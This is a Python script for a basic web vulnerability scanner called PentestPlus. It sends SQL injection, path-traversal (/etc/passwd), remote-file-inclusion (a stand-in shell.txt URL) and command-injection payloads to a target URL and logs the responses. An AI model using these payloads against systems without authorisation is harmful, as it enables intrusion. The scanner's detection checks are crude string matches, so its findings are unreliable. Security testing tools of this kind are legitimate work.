import requests
from bs4 import BeautifulSoup
import json
import datetime
import os

class PentestPlus:
    def __init__(self, url): # Auto Run Code or Functions
        self.url = url
        self.log = []

    def start_scan(self):
        self.log.append(f"Starting scan for: {self.url}\n")
        self.scan_for_xss(self.url) 
        self.scan_for_sql_injection(self.url)
        self.scan_for_csrf(self.url)
        self.scan_for_lfi(self.url)
        self.scan_for_rfi(self.url)
        self.scan_for_command_injection(self.url)
        self.show_log()
        self.save_log_to_file()
        self.save_log_to_json()

    def scan_for_xss(self, url):
        self.log.append("Scanning for XSS vulnerabilities...\n") # add of 
        start_time = datetime.datetime.now()
        try:
            response = requests.get(url)
            if '<script>' in response.text:
                self.log.append("Potential XSS vulnerability detected!\n")
            else:
                self.log.append("No XSS vulnerabilities found.\n")
        except Exception as e:
            self.log.append(f"Error scanning for XSS: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"XSS scan completed in {end_time - start_time}\n")

    def scan_for_sql_injection(self, url):
        self.log.append("Scanning for SQL Injection vulnerabilities...\n")
        start_time = datetime.datetime.now()
        payloads = ["' OR '1'='1", "' OR '1'='1' -- ", "admin' --", "' OR 'a'='a"]
        for payload in payloads:
            try:
                target_url = f"{url}?id={payload}"
                response = requests.get(target_url)
                if "error" in response.text.lower():
                    self.log.append(f"Potential SQL Injection vulnerability detected with payload: {payload}\n")
                else:
                    self.log.append(f"No SQL Injection vulnerabilities found with payload: {payload}\n")
            except Exception as e:
                self.log.append(f"Error scanning for SQL Injection: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"SQL Injection scan completed in {end_time - start_time}\n")

    def scan_for_csrf(self, url):
        self.log.append("Scanning for CSRF vulnerabilities...\n")
        start_time = datetime.datetime.now()
        try:
            response = requests.get(url)
            if "csrf_token" not in response.text.lower():
                self.log.append("Potential CSRF vulnerability detected!\n")
            else:
                self.log.append("No CSRF vulnerabilities found.\n")
        except Exception as e:
            self.log.append(f"Error scanning for CSRF: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"CSRF scan completed in {end_time - start_time}\n")

    def scan_for_lfi(self, url):
        self.log.append("Scanning for LFI vulnerabilities...\n")
        start_time = datetime.datetime.now()
        payloads = ["../../../../etc/passwd", "../../../../windows/win.ini"]
        for payload in payloads:
            try:
                target_url = f"{url}?file={payload}"
                response = requests.get(target_url)
                if "root:x:" in response.text or "[extensions]" in response.text:
                    self.log.append(f"Potential LFI vulnerability detected with payload: {payload}\n")
                else:
                    self.log.append(f"No LFI vulnerabilities found with payload: {payload}\n")
            except Exception as e:
                self.log.append(f"Error scanning for LFI: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"LFI scan completed in {end_time - start_time}\n")

    def scan_for_rfi(self, url):
        self.log.append("Scanning for RFI vulnerabilities...\n")
        start_time = datetime.datetime.now()
        payloads = ["http://example.com/shell.txt"]
        for payload in payloads:
            try:
                target_url = f"{url}?file={payload}"
                response = requests.get(target_url)
                if "shell" in response.text:
                    self.log.append(f"Potential RFI vulnerability detected with payload: {payload}\n")
                else:
                    self.log.append(f"No RFI vulnerabilities found with payload: {payload}\n")
            except Exception as e:
                self.log.append(f"Error scanning for RFI: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"RFI scan completed in {end_time - start_time}\n")

    def scan_for_command_injection(self, url):
        self.log.append("Scanning for Command Injection vulnerabilities...\n")
        start_time = datetime.datetime.now()
        payloads = ["; ls", "&& ls", "| ls"]
        for payload in payloads:
            try:
                target_url = f"{url}?cmd={payload}"
                response = requests.get(target_url)
                if "bin" in response.text or "root" in response.text:
                    self.log.append(f"Potential Command Injection vulnerability detected with payload: {payload}\n")
                else:
                    self.log.append(f"No Command Injection vulnerabilities found with payload: {payload}\n")
            except Exception as e:
                self.log.append(f"Error scanning for Command Injection: {str(e)}\n")
        end_time = datetime.datetime.now()
        self.log.append(f"Command Injection scan completed in {end_time - start_time}\n")

    def show_log(self):
        for entry in self.log:
            print(entry)

    def save_log_to_file(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = os.path.join(os.getcwd(), f"scan_log_{timestamp}.txt")
        with open(file_path, 'w') as file:
            for entry in self.log:
                file.write(entry + "\n")
        self.log.append(f"Log saved to file: {file_path}\n")
    
    def save_log_to_json(self):
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        log_data = {
            "url": self.url,
            "timestamp": timestamp,
            "log": self.log
        }
        file_path = os.path.join(os.getcwd(), f"scan_log_{timestamp}.json")
        with open(file_path, 'w') as file:
            json.dump(log_data, file, indent=4)
        self.log.append(f"Log saved to JSON: {file_path}\n")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python pentest_plus.py <URL>")
    else:
        url = sys.argv[1]
        pentest = PentestPlus(url)
        pentest.start_scan()
        # By | Mohammed Alaa Mohammed
